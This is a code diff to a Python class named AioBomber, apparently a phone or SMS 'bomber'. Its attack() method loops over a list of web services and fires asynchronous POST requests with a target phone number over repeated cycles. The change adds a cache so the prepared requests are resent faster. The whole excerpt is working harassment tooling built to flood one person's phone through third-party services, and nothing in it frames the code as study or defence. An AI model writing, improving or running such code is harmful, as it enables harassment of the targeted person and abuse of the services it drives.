@@ -19,16 +19,22 @@ class AioBomber:
             except RuntimeError:
                 loop = asyncio.get_event_loop()
         self._loop = loop
+        self._cache = {}
 
     async def attack(self, number_of_cycles: int, phone: str, sleep_time: int = 2, path_to_service: str = None) -> None:
         logger.info('Start attack')
         path_to_service = path_to_service or 'aio_bomber/services.json'
         services = await self._sender.get_services(path_to_service)
         for _ in range(number_of_cycles):
-            for value in services.values():
-                args = self._preparer.generate_args(value, phone)
-                header = value.get('header')
-                self._loop.create_task(self._sender.post(header=header, **args))
+            if not len(self._cache):
+                for key, value in services.items():
+                    args = self._preparer.generate_args(value, phone)
+                    args.update({'header': value.get('header')})
+                    self._cache[key] = args
+                    self._loop.create_task(self._sender.post(**args))
+            else:
+                for value in self._cache.values():
+                    self._loop.create_task(self._sender.post(**value))
             await asyncio.sleep(sleep_time)
 
     @property
